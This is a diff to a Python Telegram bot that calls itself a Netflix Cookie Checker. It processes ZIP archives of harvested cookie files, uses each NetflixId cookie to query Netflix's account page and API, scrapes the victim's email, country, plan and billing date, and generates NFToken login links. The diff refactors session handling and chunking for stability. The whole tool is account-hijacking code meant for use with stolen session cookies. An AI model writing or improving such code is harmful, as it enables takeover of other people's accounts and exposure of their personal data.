@@ -11,6 +11,7 @@ import urllib.parse
 from datetime import datetime
 from threading import Lock
 import time
+import gc
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -114,8 +115,8 @@ if not BOT_TOKEN:
     sys.exit(1)
 
 MAX_FILE_SIZE = 5 * 1024 * 1024
-CHUNK_SIZE = 50  # Process 50 files at a time
-MAX_RETRIES = 3
+CHUNK_SIZE = 30  # Smaller chunks for stability
+MAX_RETRIES = 2
 
 # ============ COUNTERS ============
 class Counters:
@@ -154,6 +155,22 @@ class Counters:
             self.bad = 0
 
 counters = Counters()
+
+# ============ SESSION MANAGEMENT ============
+def get_session():
+    """Create a new session with connection pooling disabled"""
+    session = requests.Session()
+    session.headers.update(BASE_HEADERS)
+    # Disable connection pooling to prevent leaks
+    session.adapters.clear()
+    return session
+
+def close_session(session):
+    """Close session and clean up"""
+    try:
+        session.close()
+    except:
+        pass
 
 # ============ COOKIE EXTRACTION FUNCTIONS ============
 def parse_netscape_cookie_line(line):
@@ -230,38 +247,38 @@ def get_nftoken_from_cookies(cookie_dict):
     if not netflix_id:
         return None, None
     
-    headers = dict(BASE_HEADERS)
-    headers["Cookie"] = f"NetflixId={netflix_id}"
-    
-    for attempt in range(MAX_RETRIES):
-        try:
-            response = requests.get(
-                API_URL,
-                params=QUERY_PARAMS,
-                headers=headers,
-                timeout=20,
-                verify=False,
-            )
-            response.raise_for_status()
-            data = response.json()
-            
-            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
-            token = token_data.get("token")
-            expires = token_data.get("expires")
-            
-            if not token:
-                return None, None
-            
-            if isinstance(expires, int) and len(str(expires)) == 13:
-                expires //= 1000
-            
-            return token, expires
-        except:
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(1)
-            continue
-    
-    return None, None
+    session = None
+    try:
+        session = get_session()
+        headers = dict(BASE_HEADERS)
+        headers["Cookie"] = f"NetflixId={netflix_id}"
+        
+        response = session.get(
+            API_URL,
+            params=QUERY_PARAMS,
+            headers=headers,
+            timeout=15,
+            verify=False,
+        )
+        response.raise_for_status()
+        data = response.json()
+        
+        token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
+        token = token_data.get("token")
+        expires = token_data.get("expires")
+        
+        if not token:
+            return None, None
+        
+        if isinstance(expires, int) and len(str(expires)) == 13:
+            expires //= 1000
+        
+        return token, expires
+    except:
+        return None, None
+    finally:
+        if session:
+            close_session(session)
 
 def format_expiry(expires):
     if not isinstance(expires, (int, float)):
@@ -276,77 +293,77 @@ def get_account_info(cookie_dict):
     if not netflix_id:
         return None
     
-    url = "https://www.netflix.com/account"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "keep-alive",
-    }
-    cookies = {"NetflixId": netflix_id}
-    
-    for attempt in range(MAX_RETRIES):
-        try:
-            response = requests.get(url, headers=headers, cookies=cookies, timeout=15, verify=False)
-            text = response.text
-            
-            info = {
-                "status": "Unknown",
-                "email": "Unknown",
-                "country": "Unknown",
-                "plan": "Unknown",
-                "maxStreams": "Unknown",
-                "memberSince": "Unknown",
-                "nextBilling": "Unknown",
-            }
-            
-            status_match = re.search(r'"membershipStatus":"(\w+)"', text)
-            if status_match:
-                status = status_match.group(1)
-                if status == "CURRENT_MEMBER":
-                    info["status"] = "Active"
-                elif status == "FORMER_MEMBER":
-                    info["status"] = "Canceled"
-                elif status == "NEVER_MEMBER":
-                    info["status"] = "Free"
-                else:
-                    info["status"] = status
-            
-            email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
-            if not email_match:
-                email_match = re.search(r'"emailAddress":"([^"]+)"', text)
-            if email_match:
-                info["email"] = fix_email_display(email_match.group(1))
-            
-            country_match = re.search(r'"currentCountry":"([^"]+)"', text)
-            if country_match:
-                info["country"] = country_match.group(1)
-            
-            plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
-            if not plan_match:
-                plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
-            if plan_match:
-                info["plan"] = plan_match.group(1)
-            
-            streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
-            if streams_match:
-                info["maxStreams"] = streams_match.group(1)
-            
-            since_match = re.search(r'"memberSince":"([^"]+)"', text)
-            if since_match:
-                info["memberSince"] = since_match.group(1)
-            
-            billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
-            if billing_match:
-                info["nextBilling"] = billing_match.group(1)
-            
-            return info
-        except:
-            if attempt < MAX_RETRIES - 1:
-                time.sleep(1)
-            continue
-    
-    return None
+    session = None
+    try:
+        session = get_session()
+        url = "https://www.netflix.com/account"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Connection": "close",  # Force connection close
+        }
+        cookies = {"NetflixId": netflix_id}
+        
+        response = session.get(url, headers=headers, cookies=cookies, timeout=12, verify=False)
+        text = response.text
+        
+        info = {
+            "status": "Unknown",
+            "email": "Unknown",
+            "country": "Unknown",
+            "plan": "Unknown",
+            "maxStreams": "Unknown",
+            "memberSince": "Unknown",
+            "nextBilling": "Unknown",
+        }
+        
+        status_match = re.search(r'"membershipStatus":"(\w+)"', text)
+        if status_match:
+            status = status_match.group(1)
+            if status == "CURRENT_MEMBER":
+                info["status"] = "Active"
+            elif status == "FORMER_MEMBER":
+                info["status"] = "Canceled"
+            elif status == "NEVER_MEMBER":
+                info["status"] = "Free"
+            else:
+                info["status"] = status
+        
+        email_match = re.search(r'"profileEmailAddress":"([^"]+)"', text)
+        if not email_match:
+            email_match = re.search(r'"emailAddress":"([^"]+)"', text)
+        if email_match:
+            info["email"] = fix_email_display(email_match.group(1))
+        
+        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
+        if country_match:
+            info["country"] = country_match.group(1)
+        
+        plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"', text)
+        if not plan_match:
+            plan_match = re.search(r'"localizedPlanName":"([^"]+)"', text)
+        if plan_match:
+            info["plan"] = plan_match.group(1)
+        
+        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":(\d+)', text)
+        if streams_match:
+            info["maxStreams"] = streams_match.group(1)
+        
+        since_match = re.search(r'"memberSince":"([^"]+)"', text)
+        if since_match:
+            info["memberSince"] = since_match.group(1)
+        
+        billing_match = re.search(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"', text)
+        if billing_match:
+            info["nextBilling"] = billing_match.group(1)
+        
+        return info
+    except:
+        return None
+    finally:
+        if session:
+            close_session(session)
 
 def classify_plan(plan_name):
     if not plan_name:
@@ -492,12 +509,12 @@ async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "ℹ️ **About Bot**\n\n"
         "Netflix Cookie Checker Bot\n"
         "Checks Netflix cookies and generates NFToken links.\n\n"
-        "🔹 Version: 5.0\n"
+        "🔹 Version: 6.0 (Stable)\n"
         "🔹 Supports: ZIP only\n"
         "🔹 Max file size: 5 MB\n"
         f"🔹 Chunk size: {CHUNK_SIZE}\n"
-        "🔹 Each account shown separately\n"
-        "🔹 Live statistics during scanning"
+        "🔹 Auto connection cleanup\n"
+        "🔹 Each account shown separately"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
@@ -624,6 +641,10 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
             
             for txt_file in chunk:
                 try:
+                    # Force garbage collection periodically
+                    if completed % 100 == 0 and completed > 0:
+                        gc.collect()
+                    
                     result = process_cookie_file(txt_file)
                     completed += 1
                     
@@ -651,9 +672,9 @@ async def process_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE, f
                     print(f"Error processing file: {e}")
                     continue
             
-            # Small delay between chunks to prevent CPU overload
+            # Delay between chunks
             if i + CHUNK_SIZE < total_files:
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.3)
         
         # Delete status message
         await status_msg.delete()
@@ -820,6 +841,7 @@ def main():
         print("📦 Max file size: 5 MB")
         print("📊 Live statistics enabled!")
         print("🌐 Keep-alive server running for Render")
+        print("🧹 Auto connection cleanup enabled")
         
         application.run_polling(allowed_updates=Update.ALL_TYPES)
             
